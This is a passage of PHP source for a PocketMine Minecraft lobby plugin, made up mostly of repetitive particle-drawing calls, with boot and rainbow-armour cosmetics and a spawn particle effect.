		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.9)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z + 1)));
		 
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z + 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z + 1)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.9, $y + 2.5, $z - 0.1)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z - 0.1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.9, $y + 2.5, $z - 0.1)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.9, $y + 2.5, $z - 0.2)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z - 0.2)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.9, $y + 2.5, $z - 0.2)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z - 0.3)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z - 0.3)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z - 0.3)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.8, $y + 2.5, $z - 0.4)));
 		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z - 0.4)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.8, $y + 2.5, $z - 0.4)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z - 0.5)));
 		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.5)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z - 0.5)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.7, $y + 2.5, $z - 0.6)));
 		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.6)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.7, $y + 2.5, $z - 0.6)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.7)));		
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.7)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.7)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.6, $y + 2.5, $z - 0.8)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.8)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.8)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 0.9)));
		 
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 0.9)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.9)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, -1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.1, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.2, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.3, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.4, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x + 0.5, $y + 2.5, $z - 1)));
		
		$level->addParticle(new SmokeParticle(new Vector3($x, $y + 2.5, -1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.1, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.2, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.3, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.4, $y + 2.5, $z - 1)));
		$level->addParticle(new SmokeParticle(new Vector3($x - 0.5, $y + 2.5, $z - 1)));
				
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.2, $y + 2.3, 1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.3, $y + 2.3, 1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.4, $y + 2.3, 1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, 1))); 
				$level->addParticle(new RainSplashParticle(new Vector3($x, $y + 2.3, 1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.1, $y + 2.3, 1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.2, $y + 2.3, 1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.3, $y + 2.3, 1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.4, $y + 2.3, $z + 0.7)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.5, $y + 2.3, $z + 0.7)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.6, $y + 2.3, $z + 0.7)));
				$level->addParticle(new RainSplashParticle(new Vector3($x, $y + 2.3, $z + 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.1, $y + 2.3, $z + 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.2, $y + 2.3, $z + 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.3, $y + 2.3, $z + 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.4, $y + 2.3, $z + 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, $z + 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.6, $y + 2.3, $z + 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, $z + 0.4)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.6, $y + 2.3, $z + 0.4)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.7, $y + 2.3, $z + 0.4)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.2, $y + 2.3, $z + 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.3, $y + 2.3, $z + 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.4, $y + 2.3, $z + 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, $z + 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.6, $y + 2.3, $z + 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.7, $y + 2.3, $z + 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.5, $y + 2.5, $z + 0.1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.6, $y + 2.5, $z + 0.1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.7, $y + 2.5, $z + 0.1)));
				
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.2, $y + 2.3, $z -1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.3, $y + 2.3, $z -1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.4, $y + 2.3, $z -1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, $z -1))); 
				$level->addParticle(new RainSplashParticle(new Vector3($x, $y + 2.3, $z -1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.1, $y + 2.3, $z -1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.2, $y + 2.3, $z -1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.3, $y + 2.3, $z -1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.4, $y + 2.3, $z - 0.7)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.5, $y + 2.3, $z - 0.7)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.6, $y + 2.3, $z - 0.7)));
				$level->addParticle(new RainSplashParticle(new Vector3($x, $y + 2.3, $z - 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.1, $y + 2.3, $z - 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.2, $y + 2.3, $z - 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.3, $y + 2.3, $z - 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.4, $y + 2.3, $z - 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, $z - 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.6, $y + 2.3, $z - 0.8)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, $z - 0.4)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.6, $y + 2.3, $z - 0.4)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.7, $y + 2.3, $z - 0.4)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.2, $y + 2.3, $z - 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.3, $y + 2.3, $z - 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.4, $y + 2.3, $z - 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.5, $y + 2.3, $z - 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.6, $y + 2.3, $z - 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x + 0.7, $y + 2.3, $z - 0.2)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.5, $y + 2.5, $z - 0.1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.6, $y + 2.5, $z - 0.1)));
				$level->addParticle(new RainSplashParticle(new Vector3($x - 0.7, $y + 2.5, $z - 0.1)));
			
			}			
			
			//Boots
			if(in_array($name, $this->plugin->heart)) {
				
				$player->getLevel()->addParticle(new HeartParticle(new Vector3($player->getX(), $player->getY() + 0.5, $player->getZ())), $players);
				$effect = Effect::getEffect(10);
				$player->addEffect(new EffectInstance($effect, 999, 1));				
				$player->getArmorInventory()->setBoots(Item::get(301, 0, 1));
								
			}
			
			if(in_array($name, $this->plugin->jump)) {
				
				$player->getLevel()->addParticle(new LavaParticle(new Vector3($player->getX(), $player->getY() + 0.5, $player->getZ())), $players);
				$effect = Effect::getEffect(8);
				$player->addEffect(new EffectInstance($effect, 999, 1));				
				$player->getArmorInventory()->setBoots(Item::get(317, 0, 1));
								
			}
			
			if(in_array($name, $this->plugin->speed)) {
				
				$player->getLevel()->addParticle(new ExplodeParticle(new Vector3($player->getX(), $player->getY() + 0.5, $player->getZ())), $players);
				$effect = Effect::getEffect(1);
				$player->addEffect(new EffectInstance($effect, 999, 1));
				$player->getArmorInventory()->setBoots(Item::get(309, 0, 1));
								
			}
			
			if(in_array($name, $this->plugin->water)) {
				
				$player->getLevel()->addParticle(new WaterParticle(new Vector3($player->getX(), $player->getY() + 0.5, $player->getZ())), $players);
				$effect = Effect::getEffect(13);
				$player->addEffect(new EffectInstance($effect, 999, 1));
				$player->getArmorInventory()->setBoots(Item::get(313, 0, 1));
								
			}
			
		}
		
	}
	
}


class RainbowArmor extends PluginTask{

	public function __construct(LobbyCore $plugin) {
		$this->plugin = $plugin;
	}

	public function onRun($tick) {
		foreach($this->plugin->getServer()->getOnlinePlayers() as $player) {
			foreach($this->plugin->rarmor as $p){
				$helmeta = array(298, 302, 306, 310, 314);
				$chestplatea = array(299, 303, 307, 311, 315);
				$leggingsa = array(300, 304, 308, 312, 316);
				$bootsa = array(301, 305, 309, 313, 317);

				$helmet = Item::get($helmeta[array_rand($helmeta)]);
				$chestplate = Item::get($chestplatea[array_rand($chestplatea)]);
				$leggings = Item::get($leggingsa[array_rand($leggingsa)]);
				$boots = Item::get($bootsa[array_rand($bootsa)]);
				if(!$helmet == null || !$chestplate == null || !$leggings == null || !$boots == null){
					$player->getArmorInventory()->setHelmet($helmet, 0, 1);
					$player->getArmorInventory()->setChestplate($chestplate, 0, 1);
					$player->getArmorInventory()->setLeggings($leggings, 0, 1);
					$player->getArmorInventory()->setBoots($boots, 0, 1);
				}
			}
		}	
	}
}


class SpawnParticles extends PluginTask{

	public function __construct(LobbyCore $plugin) {
		$this->plugin = $plugin;
	}

	public function onRun($tick){
		$level = $this->plugin->getServer()->getDefaultLevel();
		$spawn = $this->plugin->getServer()->getDefaultLevel()->getSafeSpawn();
		$r = rand(1,300);
		$g = rand(1,300);
		$b = rand(1,300);
		$x = $spawn->getX();
		$y = $spawn->getY();
		$z = $spawn->getZ();
		$center = new Vector3($x + 0.5, $y + 0.5, $z + 0.5);
		$radius = 0.5;
		$count = 100;
		$particle = new DustParticle($center, $r, $g, $b, 1);
		for($yaw = 0, $y = $center->y; $y < $center->y + 4; $yaw += (M_PI * 2) / 20, $y += 1 / 20){
			$x = -sin($yaw) + $center->x;
			$z = cos($yaw) + $center->z;
			$particle->setComponents($x, $y, $z);
			$level->addParticle($particle);
		}
	}
}


/* class WingParticles extends PluginTask{

	private $image;

	public function __construct(LobbyCore $owner){
		$this->image = imagecreatefrompng($owner->getDataFolder() . "wings.png");
	}

	public function onRun(int $currentTick) : void{
		foreach($this->getOwner()->getServer()->getOnlinePlayers() as $player){
			$directionVector = $player->getDirectionVector();
			$sub = $directionVector()->multiply(0.5);
			$base = $player->subtract($sub)->add(0, 1.8);
			$particleDistance = 0.13;
			$imageHeight = 563;
			$halfImageWidth = 512;
			for($x = -$halfImageWidth; $x < $halfImageWidth; $x++){
				for($y = 0; $y < $imageHeight; $y++){
					$pos = $base->add($directionVector->z * $x * $particleDistance, -$y * $particleDistance, -$directionVector->x * $x * $particleDistance);
					$rgba = imagecolorsforindex($this->image, imagecolorat($this->image, $x + 16, $y));
					$alpha = $rgba["alpha"];
					if($alpha >= 95){
						continue;
					}
					$player->level->addParticle(new DustParticle($pos, $rgba["red"], $rgba["green"], $rgba["blue"], $rgba["alpha"]));
				}
			}
		}
	}
} */